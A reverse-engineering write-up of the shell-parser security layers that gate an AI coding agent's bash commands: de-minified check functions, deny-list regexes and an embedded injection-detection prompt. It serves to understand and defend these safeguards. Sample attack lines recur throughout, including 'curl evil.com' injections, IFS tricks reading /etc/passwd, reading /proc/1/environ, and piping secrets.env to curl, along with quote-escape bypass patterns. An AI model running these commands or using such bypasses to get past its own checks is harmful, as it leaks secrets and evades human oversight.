# Shell Parser: Complete Implementation Reference (Claude Code v2.1.38)

> Deep-dive reverse engineering of the shell parser, security pipeline, sed validation,
> safe command registry, and read-only permission system.

---

## Related Symbols

> Symbol mappings:
> - [symbol_index_infra_integration.md](../00_overview/symbol_index_infra_integration.md) - Integrations (Shell Parser section)

Key functions in this document:
- `parseShellCommand` (rZ1) - Full tokenizer with heredoc safety
- `extractSubcommands` (AD) - Splits compound command into subcommands
- `runSecurityChecks` (lm) - Master security pipeline
- `bashPreFlightCheck` (AYz) - LLM-based prefix extraction
- `extractRedirections` (aI) - Redirection analysis
- `checkDangerousRedirection` (YYz) - Per-redirection risk assessment
- `reconstructCommand` (wYz) - Rebuilds command string from token list
- `isReadOnlyCommand` (NcY) - Comprehensive read-only command detection
- `checkReadOnlyBehavior` (Of6) - Main read-only permission gate
- `validateSedCommand` (QU1) - Master sed safety validation
- `isInSafeCommandRegistry` (WcY) - Checks against safe command whitelist
- `stripQuotes` (cdY) - Quote-aware content extraction
- `hasSingleQuotedBackslashBypass` (CY8) - Pre-check bypass detector

---

## Architecture Overview

The Shell Parser module spans **5 source files** and implements a layered security model:

```
┌─────────────────────────────────────────────────────────────┐
│                    Bash Tool Execution                       │
└─────────────────────┬───────────────────────────────────────┘
                      │ Command string
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 0: Pre-Check (CY8 / hasSingleQuotedBackslashBypass)  │
│  Detects 'a\' pattern that can bypass quote tracking        │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Static Security Checks (lm / runSecurityChecks)   │
│                                                              │
│  Phase A: Allow-list (ndY, rdY, adY, tdY, sdY)              │
│  Phase B: Deny-list  (edY, $cY, AcY, qcY, YcY,             │
│                        zcY, wcY, KcY, HcY)                  │
└─────────────────────┬───────────────────────────────────────┘
                      │ behavior: "passthrough"
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: LLM Prefix Extraction (AYz / bashPreFlightCheck)  │
│  Extracts command prefix for permission matching            │
│  Also detects injection via "command_injection_detected"    │
└─────────────────────┬───────────────────────────────────────┘
                      │ commandPrefix: "git commit"
                      ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: Read-Only Detection (Of6 / checkReadOnlyBehavior) │
│  Determines if command is inherently read-only              │
│  Uses: WcY (registry), NcY (full check), vcY (git detect)  │
└─────────────────────────────────────────────────────────────┘
```

---

## File Map

| File | Lines | Content |
|------|-------|---------|
| `chunks.149.mjs` | ~2748-3000 | Allow-list checks, quote stripping, helpers |
| `chunks.150.mjs` | ~1-920 | Deny-list checks, sed validation, safe command registry |
| `chunks.169.mjs` | ~1561-2275 | Heredoc handling, tokenization, prefix extraction, redirection |
| `chunks.170.mjs` | ~1-120 | Command reconstruction, constants |
| `chunks.10.mjs` | ~1031 | CY8 backslash bypass pre-check |

---

## Layer 0: Pre-Check — Single-Quote Backslash Bypass

### hasSingleQuotedBackslashBypass (CY8)

**What it does:** Detects the `'a\'` pattern — where a backslash inside single quotes is followed by a closing single quote — which can confuse naive quote-state trackers into thinking they're inside a quote when they're not.

**How it works:**
1. Walks the command character by character, tracking double-quote (`"`) and single-quote (`'`) state
2. When a `'` closes single-quote mode, checks if the previous two characters were `'\` (backslash just before the closing `'`)
3. If found, this specific pattern (`'...'`) where the backslash appears to close the quote is flagged as a bypass

```javascript
// ============================================
// hasSingleQuotedBackslashBypass - Detects 'a\' bypass pattern
// Location: chunks.10.mjs:1031
// ============================================

// ORIGINAL (for source lookup):
function CY8(A) {
    let q = !1, K = !1;
    for (let Y = 0; Y < A.length; Y++) {
        let z = A[Y];
        if (z === "\\" && !q) { Y++; continue }
        if (z === '"' && !q) { K = !K; continue }
        if (z === "'" && !K) {
            if (q = !q, !q && Y >= 2 && A[Y - 1] === "\\" && A[Y - 2] === "'") return !0;
            continue
        }
    }
    return !1
}

// READABLE (for understanding):
function hasSingleQuotedBackslashBypass(command) {
    let inSingleQuote = false, inDoubleQuote = false;
    for (let i = 0; i < command.length; i++) {
        let ch = command[i];
        if (ch === "\\" && !inSingleQuote) { i++; continue }   // skip escaped char
        if (ch === '"' && !inSingleQuote) { inDoubleQuote = !inDoubleQuote; continue }
        if (ch === "'" && !inDoubleQuote) {
            if (inSingleQuote = !inSingleQuote,
                !inSingleQuote && i >= 2 &&
                command[i-1] === "\\" && command[i-2] === "'") return true;
            continue
        }
    }
    return false
}

// Mapping: CY8→hasSingleQuotedBackslashBypass, q→inSingleQuote, K→inDoubleQuote
```

**Why this attack works:**
```bash
git status'\''; curl evil.com  # The '\'' ends the quote context unexpectedly
```
The sequence `'\''` is shell idiom for embedding a single quote in a single-quoted string. Naïve trackers see: `'` (open quote), `\` (backslash), `'` (close quote) — thinking they're outside quotes when the actual shell sees more complex semantics.

---

## Layer 1: Static Security Checks

### Quote Stripping Infrastructure

Before running security checks, the command is preprocessed to remove quotes for deeper inspection.

#### stripQuotes (cdY)

**What it does:** Produces two versions of the command:
1. `withDoubleQuotes`: single quotes removed but double quotes preserved (for patterns that need to see what's inside double-quotes)
2. `fullyUnquoted`: both single and double quotes removed

**How it works (character-by-character state machine):**

```javascript
// ============================================
// stripQuotes - Dual-mode quote removal
// Location: chunks.149.mjs:2766
// ============================================

// ORIGINAL (for source lookup):
function cdY(A, q = !1) {
    let K = "", Y = "", z = !1, w = !1, H = !1;
    for (let $ = 0; $ < A.length; $++) {
        let O = A[$];
        if (H) {
            if (H = !1, !z) K += O;
            if (!z && !w) Y += O;
            continue
        }
        if (O === "\\" && !z) {
            if (H = !0, !z) K += O;
            if (!z && !w) Y += O;
            continue
        }
        if (O === "'" && !w) { z = !z; continue }
        if (O === '"' && !z) { if (w = !w, !q) continue }
        if (!z) K += O;
        if (!z && !w) Y += O
    }
    return { withDoubleQuotes: K, fullyUnquoted: Y }
}

// READABLE (for understanding):
function stripQuotes(command, isJq = false) {
    let withDoubleQuotes = "", fullyUnquoted = "";
    let inSingleQuote = false, inDoubleQuote = false, escaped = false;

    for (let i = 0; i < command.length; i++) {
        let ch = command[i];
        if (escaped) {
            // Post-escape char: include only if not in single quotes
            escaped = false;
            if (!inSingleQuote) withDoubleQuotes += ch;
            if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += ch;
            continue;
        }
        if (ch === "\\" && !inSingleQuote) {
            // Backslash: set escape flag but include the backslash itself
            escaped = true;
            if (!inSingleQuote) withDoubleQuotes += ch;
            if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += ch;
            continue;
        }
        if (ch === "'" && !inDoubleQuote) { inSingleQuote = !inSingleQuote; continue; }
        if (ch === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            if (!isJq) continue;  // For jq: preserve double quotes in output
        }
        if (!inSingleQuote) withDoubleQuotes += ch;
        if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += ch;
    }
    return { withDoubleQuotes, fullyUnquoted };
}

// Mapping: cdY→stripQuotes, K→withDoubleQuotes, Y→fullyUnquoted,
//   z→inSingleQuote, w→inDoubleQuote, H→escaped
```

**Key design decisions:**
- **jq exception**: The `isJq` flag keeps double quotes in the output when the base command is `jq`, because jq's filter language uses `$var` and `"string"` which would produce false positives if double quotes were stripped. The `isJq` flag is set when `baseCommand === "jq"`.
- **Backslash handling**: The backslash character itself is included in output (not just the escaped char), to preserve `\"` sequences for downstream checks that look for escaped patterns.

#### stripRedirections (ldY)

**What it does:** Removes standard/safe redirect patterns from the fully-unquoted content before pattern matching.

```javascript
// ============================================
// stripRedirections - Remove safe redirect noise
// Location: chunks.149.mjs:2800
// ============================================

// ORIGINAL (for source lookup):
function ldY(A) {
    return A.replace(/\s+2\s*>&\s*1(?=\s|$)/g, "")
             .replace(/[012]?\s*>\s*\/dev\/null/g, "")
             .replace(/\s*<\s*\/dev\/null/g, "")
}

// READABLE (for understanding):
function stripRedirections(content) {
    return content
        .replace(/\s+2\s*>&\s*1(?=\s|$)/g, "")      // Remove "2>&1" (stderr to stdout)
        .replace(/[012]?\s*>\s*\/dev\/null/g, "")    // Remove "> /dev/null", "2>/dev/null"
        .replace(/\s*<\s*\/dev\/null/g, "")           // Remove "< /dev/null"
}

// Mapping: ldY→stripRedirections
```

**Why this matters:** Common patterns like `command 2>&1 | other` or `command > /dev/null` contain `>` and `>&` which would falsely trigger dangerous-redirection checks. Stripping these known-safe patterns first prevents false positives.

---

### Phase A: Allow-List Checks

Allow-list checks run first. If any returns `"allow"`, the deny-list is skipped entirely.

#### checkEmptyCommand (ndY)

```javascript
// ============================================
// checkEmptyCommand - Allow empty commands
// Location: chunks.149.mjs:2818
// ============================================
function ndY(A) {
    if (!A.originalCommand.trim()) return {
        behavior: "allow",
        decisionReason: { type: "other", reason: "Empty command is safe" }
    };
    return { behavior: "passthrough", message: "Command is not empty" }
}
```

#### checkIncompleteCommand (rdY)

**What it does:** Detects commands that appear to be fragments of a larger command.

**Detected patterns:**
- Starts with a tab → likely an indented continuation in a multi-line script
- Starts with `-` → a bare flag without a command
- Starts with `&&`, `||`, `;`, `>>`, `<` → an operator that should follow a command

```javascript
// ============================================
// checkIncompleteCommand - Detect command fragments
// Location: chunks.149.mjs:2835
// ============================================

// ORIGINAL (for source lookup):
function rdY(A) {
    let { originalCommand: q } = A, K = q.trim();
    if (/^\s*\t/.test(q)) return c("tengu_bash_security_check_triggered",
        { checkId: kH.INCOMPLETE_COMMANDS, subId: 1 }),
        { behavior: "ask", message: "Command appears to be an incomplete fragment (starts with tab)" };
    if (K.startsWith("-")) return c("tengu_bash_security_check_triggered",
        { checkId: kH.INCOMPLETE_COMMANDS, subId: 2 }),
        { behavior: "ask", message: "Command appears to be an incomplete fragment (starts with flags)" };
    if (/^\s*(&&|\|\||;|>>?|<)/.test(q)) return c("tengu_bash_security_check_triggered",
        { checkId: kH.INCOMPLETE_COMMANDS, subId: 3 }),
        { behavior: "ask", message: "Command appears to be a continuation line (starts with operator)" };
    return { behavior: "passthrough", message: "Command appears complete" }
}

// READABLE (for understanding):
function checkIncompleteCommand({ originalCommand }) {
    let trimmed = originalCommand.trim();
    if (/^\s*\t/.test(originalCommand))
        return { behavior: "ask", message: "Incomplete fragment (starts with tab)" };
    if (trimmed.startsWith("-"))
        return { behavior: "ask", message: "Incomplete fragment (starts with flag)" };
    if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand))
        return { behavior: "ask", message: "Continuation line (starts with operator)" };
    return { behavior: "passthrough" };
}

// Mapping: rdY→checkIncompleteCommand, q→originalCommand, K→trimmed
```

**Why tab detection?** The LLM sometimes generates indented shell script fragments instead of standalone commands. A command starting with a tab is almost always a fragment from a multi-line heredoc or script block.

#### checkHeredocInSubstitution (adY) + isQuotedHeredocInSubstitution (odY)

**What it does:** Allows `$(cat <<'EOF' ... EOF)` patterns — Claude Code's own standard format for multi-line strings. Without this allowance, Claude Code would flag its own commands as dangerous.

**How odY works (step by step):**
1. Check if command matches `HEREDOC_IN_SUBSTITUTION_PATTERN` (`/\$\(.*<</`)
2. Find all `$(cat <<'DELIM'` or `$(cat <<\DELIM` patterns
3. For each, verify the full `$(cat <<'DELIM'\n...\nDELIM)` structure is present
4. After replacing all safe heredocs, check if any `$(` or `${` remain
5. If residual substitutions exist, it's NOT safe

```javascript
// ============================================
// isQuotedHeredocInSubstitution - Validates $(cat <<'EOF') safety
// Location: chunks.149.mjs:2866
// ============================================

// ORIGINAL (for source lookup):
function odY(A) {
    if (!PhA.test(A)) return !1;
    let q = /\$\(cat\s*<<-?\s*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g, K, Y = [];
    while ((K = q.exec(A)) !== null) {
        let w = K[1] || K[2];
        if (w) Y.push({ start: K.index, delimiter: w })
    }
    if (Y.length === 0) return !1;
    for (let { start: w, delimiter: H } of Y) {
        let $ = A.substring(w), O = H.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        if (!new RegExp(`(?:\n|^[^\\n]*\n)${O}\\s*\\)`).test($)) return !1;
        let J = new RegExp(`^\\$\\(cat\\s*<<-?\\s*(?:'+${O}'+|\\\\${O})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${O}\\s*\\)`);
        if (!$.match(J)) return !1
    }
    let z = A;
    for (let { delimiter: w } of Y) {
        let H = w.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
            $ = new RegExp(`\\$\\(cat\\s*<<-?\\s*(?:'+${H}'+|\\\\${H})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${H}\\s*\\)`);
        z = z.replace($, "")
    }
    if (/\$\(/.test(z)) return !1;
    if (/\$\{/.test(z)) return !1;
    return !0
}

// READABLE (for understanding):
function isQuotedHeredocInSubstitution(command) {
    if (!HEREDOC_IN_SUBSTITUTION_PATTERN.test(command)) return false;

    // Find all $(cat <<'DELIM') or $(cat <<\DELIM) occurrences
    let quotedHeredocRegex = /\$\(cat\s*<<-?\s*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g;
    let matches = [], match;
    while ((match = quotedHeredocRegex.exec(command)) !== null) {
        let delim = match[1] || match[2];
        if (delim) matches.push({ start: match.index, delimiter: delim });
    }
    if (matches.length === 0) return false;

    // Verify each match has a proper closing delimiter
    for (let { start, delimiter } of matches) {
        let segment = command.substring(start);
        let escapedDelim = delimiter.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        // Must have a line with just the delimiter before ")"
        if (!new RegExp(`(?:\n|^[^\\n]*\n)${escapedDelim}\\s*\\)`).test(segment)) return false;
        // Full structure must match
        let fullPattern = new RegExp(
            `^\\$\\(cat\\s*<<-?\\s*(?:'+${escapedDelim}'+|\\\\${escapedDelim})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${escapedDelim}\\s*\\)`
        );
        if (!segment.match(fullPattern)) return false;
    }

    // After removing all safe heredocs, no $(  or ${ should remain
    let remaining = command;
    for (let { delimiter } of matches) {
        let escapedDelim = delimiter.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        let removePattern = new RegExp(
            `\\$\\(cat\\s*<<-?\\s*(?:'+${escapedDelim}'+|\\\\${escapedDelim})[^\\n]*\\n(?:[\\s\\S]*?\\n)?${escapedDelim}\\s*\\)`
        );
        remaining = remaining.replace(removePattern, "");
    }
    if (/\$\(/.test(remaining) || /\$\{/.test(remaining)) return false;
    return true;
}

// Mapping: odY→isQuotedHeredocInSubstitution, PhA→HEREDOC_IN_SUBSTITUTION_PATTERN
```

**Key insight:** The "remaining after removal" check is critical. A command like:
```bash
git commit -m "$(cat <<'EOF'\nfix\nEOF)" && $(evil)
```
Would have its safe heredoc removed, but `$(evil)` would remain, causing the check to return `false` → command goes through deny-list.

#### checkGitCommitMessage (sdY)

**What it does:** Handles the `git commit -m "..."` pattern — one of the most common Claude Code operations. Allows or blocks based on what's inside the message.

**Decision tree:**
```
git commit -m "MESSAGE"?
  ├── Double-quoted + contains $( ` ${  → ASK (substitution risk)
  ├── Content after message has $( ` ${ → PASSTHROUGH (let other checks handle)
  ├── Message starts with "-"           → ASK (flag injection risk)
  └── Otherwise                         → ALLOW
```

```javascript
// ============================================
// checkGitCommitMessage - git commit safety logic
// Location: chunks.149.mjs:2929
// ============================================

// ORIGINAL (for source lookup):
function sdY(A) {
    let { originalCommand: q, baseCommand: K } = A;
    if (K !== "git" || !/^git\s+commit\s+/.test(q)) return { behavior: "passthrough" };
    let Y = q.match(/^git\s+commit\s+.*-m\s+(["'])([\s\S]*?)\1(.*)$/);
    if (Y) {
        let [, z, w, H] = Y;
        if (z === '"' && w && /\$\(|`|\$\{/.test(w)) return { behavior: "ask" };
        if (H && /\$\(|`|\$\{/.test(H)) return { behavior: "passthrough" };
        if (w && w.startsWith("-")) return { behavior: "ask" };
        return { behavior: "allow", updatedInput: { command: q },
                 decisionReason: { type: "other", reason: "Git commit with simple quoted message is allowed" } }
    }
    return { behavior: "passthrough" }
}

// READABLE (for understanding):
function checkGitCommitMessage({ originalCommand, baseCommand }) {
    if (baseCommand !== "git" || !/^git\s+commit\s+/.test(originalCommand))
        return { behavior: "passthrough" };

    let messageMatch = originalCommand.match(/^git\s+commit\s+.*-m\s+(["'])([\s\S]*?)\1(.*)$/);
    if (messageMatch) {
        let [, quoteChar, message, trailingFlags] = messageMatch;
        // Double-quoted message with command substitution → dangerous
        if (quoteChar === '"' && message && /\$\(|`|\$\{/.test(message))
            return { behavior: "ask", message: "Git commit message contains command substitution" };
        // Trailing flags after message → let other checks handle
        if (trailingFlags && /\$\(|`|\$\{/.test(trailingFlags))
            return { behavior: "passthrough" };
        // Message as flag (starts with dash) → flag injection risk
        if (message && message.startsWith("-"))
            return { behavior: "ask", message: "Quoted flag name bypass" };
        // Clean message → allow
        return { behavior: "allow", updatedInput: { command: originalCommand } };
    }
    return { behavior: "passthrough" };
}

// Mapping: sdY→checkGitCommitMessage, Y→messageMatch, z→quoteChar, w→message, H→trailingFlags
```

**Why single-quoted is safe, double-quoted is not:**
- `git commit -m 'Fix $(broken)'` — shell does NOT expand `$(...)` inside single quotes
- `git commit -m "Fix $(date)"` — shell DOES expand `$(date)` inside double quotes

**Why flag-injection check?** The pattern `git commit -m "-force"` would cause git to interpret `"-force"` as a flag, potentially bypassing intended behavior. Since `-m` consumes the next argument as the message, any message starting with `-` is suspicious.

#### checkQuotedHeredoc (tdY)

```javascript
// ============================================
// checkQuotedHeredoc - Allow heredocs with quoted/escaped delimiters
// Location: chunks.149.mjs:2976
// ============================================
function tdY(A) {
    let { originalCommand: q } = A;
    if (PhA.test(q)) return { behavior: "passthrough" };  // adY handles heredoc-in-$()
    let K = /<<-?\s*'[^']+'/;  // <<'DELIM' or <<-'DELIM'
    let Y = /<<-?\s*\\\w+/;     // <<\DELIM or <<-\DELIM
    if (K.test(q) || Y.test(q)) return {
        behavior: "allow",
        decisionReason: { type: "other", reason: "Heredoc with quoted/escaped delimiter is safe" }
    };
    return { behavior: "passthrough" }
}
```

**Why quoted/escaped delimiters are safe:** In bash:
- `<<'EOF'` — single-quoted delimiter → heredoc content has NO variable expansion
- `<<\EOF` — escaped delimiter → same effect as single-quoted
- `<<EOF` — unquoted delimiter → content IS subject to variable expansion

The security system only needs to block heredocs where the content could execute code. Quoted/escaped delimiters guarantee the content is literal text.

---

### Phase B: Deny-List Checks

These run after allow-list checks. The first check to return `"ask"` wins.

**Deny-list order in `runSecurityChecks`:**
1. `edY` — checkJqCommand
2. `$cY` — checkObfuscatedFlags
3. `AcY` — checkShellMetacharacters
4. `qcY` — checkDangerousVariables
5. `YcY` — checkNewlines
6. `zcY` — checkIFSInjection
7. `wcY` — checkProcEnviron
8. `KcY` — checkDangerousPatterns
9. `HcY` — checkMalformedTokenInjection

#### checkJqCommand (edY)

**What it does:** Special-case validation for `jq` commands. The `jq` tool has two dangerous capabilities:
- `system("cmd")` — executes arbitrary shell commands from within a jq filter
- `-f FILE` / `--rawfile FILE` — reads filter expressions from files, enabling arbitrary code execution

```javascript
// ============================================
// checkJqCommand - jq-specific security validation
// Location: chunks.150.mjs:3
// ============================================
function checkJqCommand({ originalCommand, baseCommand }) {
    if (baseCommand !== "jq") return { behavior: "passthrough" };

    // system() executes shell commands from jq filter
    if (/\bsystem\s*\(/.test(originalCommand))
        return { behavior: "ask", message: "jq command contains system() function" };

    // Dangerous flags that read filter expressions from files
    let afterJq = originalCommand.substring(3).trim();
    if (/(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(afterJq))
        return { behavior: "ask", message: "jq command contains dangerous file-reading flags" };

    return { behavior: "passthrough" };
}
```

**> Note:** The existing `heredoc_security.md` document incorrectly labeled `edY` as `checkDangerousPatterns`. The actual dangerous patterns check is `KcY`. `edY` is the **jq-specific** security check.

#### checkObfuscatedFlags ($cY)

**What it does:** Detects quoting constructs used to hide flag names or inject newlines.

**Detection logic (multi-pass):**

```
Pass 1: ANSI-C quoting ($'...')
  → Can embed \x0a (newline), \x00 (null), etc.
  → Example: git status $'\x0a' curl evil.com

Pass 2: Locale quoting ($"...")
  → Locale-translated strings may not be what they appear

Pass 3: Empty special quotes before dash ($'' -, "" -)
  → $''-flag or ""-flag: empty ANSI-C/locale quote before flag name

Pass 4: Empty regular quotes before dash ('' -, "" -)
  → Same but with regular quotes

Pass 5: Quoted flag names (character walk)
  → Detects patterns like git '-v' or git "-flag"
  → Walk looking for: space + quote + dash-prefixed content inside quotes

Pass 6: Post-strip check
  → After fully stripping: space + quote/backtick + dash
  → Double quotes before dash
```

**Special case — `echo` exemption:**
```javascript
if (K === "echo" && !Y) return { behavior: "passthrough" };
// echo without separators is safe even with quoted chars
```
`echo` is commonly used to output quoted strings. The check skips `echo` unless there are pipes/separators, which would indicate a compound command where the quoting might be attacking the second command.

**Special case — `cut -d` exemption:**
```javascript
if (K === "cut" && X === "-d" && /['"`]/.test(D)) break;
// cut -d':' or cut -d"," is common and safe
```
`cut -d` requires a delimiter character, which is often a punctuation mark inside quotes.

#### checkShellMetacharacters (AcY)

**What it does:** Detects shell metacharacters (`; | &`) inside quoted arguments — which could be an attempt to inject commands that only execute when the shell processes the outer command.

**Example attack:**
```bash
find . -name "*.py; curl evil.com"
# If the quotes are stripped improperly, this could become:
find . -name *.py; curl evil.com
```

**Detection patterns:**
1. Quoted arg containing semicolon/ampersand: `["'][^"']*[;&][^"']*["']`
2. `find -name`/`-path`/`-iname` with metachar in arg
3. `find -regex` with metachar in arg

#### checkDangerousVariables (qcY)

**What it does:** Detects variables (`$VARNAME`) used directly in redirection or pipe contexts.

```javascript
// Detects: > $FILE, < $VAR, | $CMD, $VAR |
if (/[<>|]\s*\$[A-Za-z_]/.test(fullyUnquotedContent) ||
    /\$[A-Za-z_][A-Za-z0-9_]*\s*[|<>]/.test(fullyUnquotedContent))
    return { behavior: "ask" }
```

**Why this is dangerous:** Variable expansion in redirection targets can redirect output to attacker-controlled locations:
```bash
# If $LOGFILE is controlled via prompt injection:
npm test 2>&1 > $LOGFILE  # Could write to /etc/cron.d/evil
```

#### checkNewlines (YcY)

**What it does:** Detects embedded newlines that could hide additional commands.

**Algorithm:**
1. If no `\n` or `\r` in fully-unquoted content → safe
2. If a newline is followed by a command-like character → dangerous

```javascript
// After newline: letter, path chars, glob, subshell, redirect, etc.
if (/[\n\r]\s*[a-zA-Z/.~({$![>|]/.test(fullyUnquotedContent))
    return { behavior: "ask" }
```

**Attack example:**
```bash
git status
curl evil.com  # Hidden after newline
```

**Why the character class matters:** After a newline, the following characters start valid commands or redirections. The check excludes digits, hyphens, etc. that wouldn't start a dangerous second command.

#### checkIFSInjection (zcY)

**What it does:** Detects `$IFS` or `${...IFS...}` variable references.

**Attack:**
```bash
IFS=/ && cat$IFS/etc/passwd
# IFS changed to "/" — "cat/etc/passwd" becomes "cat" + "/etc/passwd"
# With modified IFS, field splitting works differently
```

The check applies to the **original command** (not quote-stripped) because IFS references are dangerous regardless of quoting context.

#### checkProcEnviron (wcY)

**What it does:** Blocks access to `/proc/*/environ`.

**Attack:**
```bash
cat /proc/1/environ  # Reads process environment of PID 1 (init)
# May expose secrets, tokens, credentials from other processes
```

#### checkDangerousPatterns (KcY)

**What it does:** The main catch-all for command substitution and process substitution patterns.

**Three-stage detection:**
1. **Backtick detection:** Uses `idY` (hasUnescapedChar) to find unescaped backticks
2. **Pattern list check:** Against `DANGEROUS_PATTERNS` array on `unquotedContent`
3. **Redirection check:** Against `fullyUnquotedContent` for `<` and `>`

```javascript
// DANGEROUS_PATTERNS array (ddY):
[
    { pattern: /<\(/, message: "process substitution <()" },
    { pattern: />\(/, message: "process substitution >()" },
    { pattern: /\$\(/, message: "$() command substitution" },
    { pattern: /\$\{/, message: "${} parameter substitution" },
    { pattern: /\$\[/, message: "$[] legacy arithmetic expansion" },
    { pattern: /~\[/, message: "Zsh-style parameter expansion" },
    { pattern: /\(e:/, message: "Zsh-style glob qualifiers" },
    { pattern: /<#/, message: "PowerShell comment syntax" }
]
```

**Why check unquotedContent (with double quotes) for patterns, but fullyUnquoted for redirects?**
- Patterns like `$(` and `${` are dangerous even inside double-quoted strings (they're still expanded)
- Redirection `<` and `>` are only dangerous outside all quotes — hence fully-unquoted check

#### checkMalformedTokenInjection (HcY)

**What it does:** Parses the command with the shell tokenizer and checks for unbalanced brackets in tokens that appear around command separators.

**Algorithm:**
1. Tokenize command via `shellTokenize` (pz)
2. If tokenization fails → passthrough (handled elsewhere)
3. Check if any `;`, `&&`, or `||` separators are present
4. If yes, call `pdY` (hasMalformedBrackets) on all tokens

**hasMalformedBrackets (pdY) logic:**
For each string token, count:
- `{` vs `}` — must be equal
- `(` vs `)` — must be equal
- `[` vs `]` — must be equal
- Unescaped `"` — count must be even
- Unescaped `'` — count must be even

If any counts are unbalanced, return `true` (malformed).

**Why this catches injections:** An injection attempt might produce:
```bash
git status; "echo injected
# The " is unbalanced in the token before ;
# pdY detects the unbalanced " and flags as malformed
```

---

### The runSecurityChecks Master Function (lm)

```javascript
// ============================================
// runSecurityChecks - Master security validation pipeline
// Location: chunks.150.mjs:321
// ============================================

// ORIGINAL (for source lookup):
function lm(A) {
    if (CY8(A)) return { behavior: "ask", message: "..." };
    let q = A.split(" ")[0] || "",
        { withDoubleQuotes: K, fullyUnquoted: Y } = cdY(A, q === "jq"),
        z = { originalCommand: A, baseCommand: q,
              unquotedContent: K, fullyUnquotedContent: ldY(Y) },
        w = [ndY, rdY, adY, tdY, sdY];
    for (let $ of w) {
        let O = $(z);
        if (O.behavior === "allow") return { behavior: "passthrough",
            message: O.decisionReason?.type === "other" ? O.decisionReason.reason : "Command allowed" };
        if (O.behavior !== "passthrough") return O
    }
    let H = [edY, $cY, AcY, qcY, YcY, zcY, wcY, KcY, HcY];
    for (let $ of H) {
        let O = $(z);
        if (O.behavior === "ask") return O
    }
    return { behavior: "passthrough", message: "Command passed all security checks" }
}

// READABLE (for understanding):
function runSecurityChecks(command) {
    // Pre-check: detect single-quote backslash bypass
    if (hasSingleQuotedBackslashBypass(command))
        return { behavior: "ask", message: "Single-quoted backslash bypass pattern" };

    let baseCommand = command.split(" ")[0] || "";
    let { withDoubleQuotes, fullyUnquoted } = stripQuotes(command, baseCommand === "jq");
    let context = {
        originalCommand: command,
        baseCommand,
        unquotedContent: withDoubleQuotes,        // single quotes removed
        fullyUnquotedContent: stripRedirections(fullyUnquoted)  // both quotes removed + safe redirects stripped
    };

    // Phase A: Allow-list (first match wins with "allow")
    for (let check of [checkEmptyCommand, checkIncompleteCommand,
                       checkHeredocInSubstitution, checkQuotedHeredoc, checkGitCommitMessage]) {
        let result = check(context);
        if (result.behavior === "allow")
            return { behavior: "passthrough", message: result.decisionReason?.reason };
        if (result.behavior !== "passthrough") return result;
    }

    // Phase B: Deny-list (first "ask" wins)
    for (let check of [checkJqCommand, checkObfuscatedFlags, checkShellMetacharacters,
                       checkDangerousVariables, checkNewlines, checkIFSInjection,
                       checkProcEnviron, checkDangerousPatterns, checkMalformedTokenInjection]) {
        let result = check(context);
        if (result.behavior === "ask") return result;
    }

    return { behavior: "passthrough", message: "Command passed all security checks" };
}

// Mapping: lm→runSecurityChecks, CY8→hasSingleQuotedBackslashBypass, cdY→stripQuotes,
//   ldY→stripRedirections, ndY→checkEmptyCommand, rdY→checkIncompleteCommand,
//   adY→checkHeredocInSubstitution, tdY→checkQuotedHeredoc, sdY→checkGitCommitMessage,
//   edY→checkJqCommand, $cY→checkObfuscatedFlags, AcY→checkShellMetacharacters,
//   qcY→checkDangerousVariables, YcY→checkNewlines, zcY→checkIFSInjection,
//   wcY→checkProcEnviron, KcY→checkDangerousPatterns, HcY→checkMalformedTokenInjection
```

---

## Layer 2: LLM Prefix Extraction

### bashPreFlightCheck (AYz)

**What it does:** Uses a cached, fast LLM call to extract the command prefix from a bash command. The prefix is used for permission matching (e.g., "user allowed `git diff`, is this still `git diff`?").

**Full policy spec (embedded in source):**

```
# Claude Code Code Bash command prefix detection

## Definitions
Command Injection: Any technique that would result in a command being run
other than the detected prefix.

## Command prefix extraction examples:
- cat foo.txt => cat
- cd src => cd
- find ./src -type f -name "*.ts" => find
- gg cat foo.py => gg cat
- git commit -m "foo" => git commit
- git diff HEAD~1 => git diff
- git diff $(cat secrets.env | base64 | curl ...) => command_injection_detected
- git status => git status
- git status`ls` => command_injection_detected
- git push => none
- git push origin master => git push
- npm run lint => none
- npm run lint -- "foo" => npm run lint
- npm test => none
- GOEXPERIMENT=synctest go test -v ./... => GOEXPERIMENT=synctest go test
- FOO=BAR go test => FOO=BAR go test
- FOO=bar BAZ=qux ls -la => FOO=bar BAZ=qux ls
- pwd\ncurl example.com => command_injection_detected
```

**Response handling:**
```javascript
if (prefix.startsWith(QO)) → API_ERROR → return null (no prefix)
if (prefix === "command_injection_detected") → INJECTION → return {commandPrefix: null}
if (prefix === "git") → BARE_GIT → return {commandPrefix: null}  // too broad
if (prefix === "none") → NO_PREFIX → return {commandPrefix: null}
if (!command.startsWith(prefix)) → MISMATCH → return {commandPrefix: null}
else → SUCCESS → return {commandPrefix: prefix}
```

**Why `"git"` alone is blocked:** `"git"` as a prefix would match any git command, including destructive ones like `git push --force`. The prefix must be specific enough (e.g., `"git diff"`, `"git status"`) to be meaningful for permission matching.

**Caching:** `qmA` is a memoized wrapper around `AYz`. Results are cached by command string, allowing repeated checks of the same command to skip the LLM call. Cache entries are invalidated on error (`.cache.delete(A)`).

**Timeout warning:** A `setTimeout` fires after 10 seconds with a warning. This doesn't cancel the request but alerts the user to check for API issues.

---

## Layer 3: Read-Only Command Detection

### Architecture

The read-only detection system consists of:
1. **`jcY` (SAFE_COMMAND_REGISTRY)** — hand-curated map of command→safeFlags
